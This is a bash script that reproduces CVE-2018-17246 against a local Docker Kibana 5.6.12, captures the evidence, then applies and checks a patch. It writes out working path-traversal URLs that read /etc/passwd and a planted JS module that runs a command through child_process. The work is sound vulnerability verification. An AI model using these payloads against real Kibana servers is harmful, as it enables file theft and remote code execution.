#!/bin/bash
# CVE-2018-17246 evidence capture (vulnerable Kibana 5.6.12 -> patched api_server.js).
# Order matters: the RCE step runs first because a successful LFI request to a
# non-JS file makes the Kibana 5.6.x process exit (uncaught require() error).
# Each capture transcript is written to evidence/cve/*.txt and finally rendered
# into evidence/cve/*.png by scripts/render_evidence.py.
set -u
WORK=/Users/guhaotian/Desktop/work1-secure-api
CVEDIR="$WORK/CVE-2018-17246"
EVID=$WORK/evidence/cve
PY=$WORK/.venv/bin/python
export PATH="$HOME/homebrew/bin:$PATH"
mkdir -p "$EVID"

LFI_URL='http://localhost:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd'
RCE_URL='http://localhost:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../tmp/vulhub.js'

log() { echo "[$(date +%H:%M:%S)] $*"; }

wait_up() {  # wait for kibana :5601 to answer /api/status (max 2400 s)
  log "waiting for Kibana to answer /api/status (max 2400 s)..."
  for i in $(seq 1 800); do
    code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 3 http://localhost:5601/api/status 2>/dev/null || echo 000)
    if [ "$code" = "200" ]; then log "Kibana is up after ~$((i*3)) s"; return 0; fi
    sleep 3
  done
  log "Kibana did NOT come up"
  return 1
}

cd "$CVEDIR" || exit 1

log "== 01: start vulnerable environment (Kibana 5.6.12) =="
docker compose up -d > /tmp/cve_compose_up.log 2>&1
wait_up || { log "aborting: vulnerable Kibana did not start"; exit 1; }
{
  echo "\$ cd CVE-2018-17246 && docker compose up -d"
  echo
  tail -3 /tmp/cve_compose_up.log
  echo
  echo "\$ docker compose ps"
  docker compose ps 2>/dev/null
  echo
  echo "\$ curl -s -o /dev/null -w '%{http_code}' http://localhost:5601/api/status"
  curl -s -o /dev/null -w '%{http_code}\n' http://localhost:5601/api/status
} > "$EVID/01_compose_up.txt"

log "== 02: RCE - write JS module inside the container =="
{
  echo "\$ docker compose exec kibana bash -c 'cat > /tmp/vulhub.js'   # JS payload"
  echo
  echo "export default {"
  echo "  asJson: function (req, res) {"
  echo "    return require(\"child_process\").execSync(\"id\").toString();"
  echo "  }"
  echo "}"
  echo
} > "$EVID/02_rce_setup.txt"
docker compose exec -T kibana bash -c 'cat > /tmp/vulhub.js << "EOF"
export default {
  asJson: function (req, res) {
    return require("child_process").execSync("id").toString();
  }
}
EOF' > /tmp/cve_rce_setup.log 2>&1
echo "exec_exit=$?" >> "$EVID/02_rce_setup.txt"

log "== 03: RCE - load the module through the console API =="
{
  echo "\$ curl -i \"$RCE_URL\""
  echo
  curl -s -i --max-time 90 "$RCE_URL"
  echo
} > "$EVID/03_rce_request.txt"

log "== 04: RCE result - uid visible in the Kibana log =="
{
  echo "\$ docker compose logs kibana | tail -20"
  echo
  docker compose logs kibana 2>&1 | tail -20
} > "$EVID/04_rce_result.txt"

log "== 05: LFI - console API includes /etc/passwd =="
{
  echo "\$ curl -i \"$LFI_URL\""
  echo
  curl -s -i --max-time 90 "$LFI_URL"
  echo
} > "$EVID/05_lfi_request.txt"

log "== 06: LFI result - file content in the Kibana log =="
{
  echo "\$ docker compose logs kibana | grep -A6 'Uncaught error: /etc/passwd'"
  echo
  docker compose logs kibana 2>&1 | grep -A6 "Uncaught error: /etc/passwd" | head -30
} > "$EVID/06_lfi_logs.txt"

log "== 07: apply the fix (patched api_server.js mounted over the vulnerable file) =="
docker compose down > /dev/null 2>&1
docker compose -f docker-compose.fixed.yml up -d > /tmp/cve_fix_up.log 2>&1
wait_up || { log "aborting: patched Kibana did not start"; exit 1; }
{
  echo "\$ cat patched/api_server/server.js   # the fix that is mounted into the container"
  echo
  grep -n "FIX for CVE-2018-17246" -A13 patched/api_server/server.js
  echo
  echo "\$ docker compose -f docker-compose.fixed.yml up -d   # patched server.js read-only mount"
  echo
  tail -3 /tmp/cve_fix_up.log
  echo
  echo "\$ docker compose -f docker-compose.fixed.yml ps"
  docker compose -f docker-compose.fixed.yml ps 2>/dev/null
  echo
  echo "\$ docker compose -f docker-compose.fixed.yml exec kibana grep -n 'path.resolve' /usr/share/kibana/src/core_plugins/console/api_server/server.js"
  docker compose -f docker-compose.fixed.yml exec -T kibana grep -n "path.resolve" /usr/share/kibana/src/core_plugins/console/api_server/server.js
  echo
  echo "\$ curl -s -o /dev/null -w '%{http_code}' http://localhost:5601/api/status"
  curl -s -o /dev/null -w '%{http_code}\n' http://localhost:5601/api/status
} > "$EVID/07_fix_compose.txt"

log "== 08: the same LFI request against the patched version =="
{
  echo "\$ curl -i \"$LFI_URL\"   # against the patched api_server"
  echo
  curl -s -i --max-time 90 "$LFI_URL"
  echo
  echo "\$ docker compose -f docker-compose.fixed.yml logs kibana | grep -c 'Uncaught error: /etc/passwd'"
  docker compose -f docker-compose.fixed.yml logs kibana 2>&1 | grep -c "Uncaught error: /etc/passwd"
  echo
  echo "\$ curl -i \"$RCE_URL\"   # the RCE module must be rejected too"
  echo
  curl -s -i --max-time 90 "$RCE_URL"
} > "$EVID/08_lfi_after_fix.txt"

log "== 09: regression - normal UI still works on the patched version =="
{
  echo "\$ curl -s http://localhost:5601/api/status"
  curl -s --max-time 10 http://localhost:5601/api/status | head -c 300
  echo
  echo
  echo "\$ curl -s http://localhost:5601/app/kibana | head -c 200"
  curl -s --max-time 10 http://localhost:5601/app/kibana | head -c 200
} > "$EVID/09_regression_ui.txt"

docker compose -f docker-compose.fixed.yml down > /dev/null 2>&1

log "== 10: render captures to PNG =="
$PY "$WORK/scripts/render_evidence.py" "$EVID"
log "CVE evidence done"
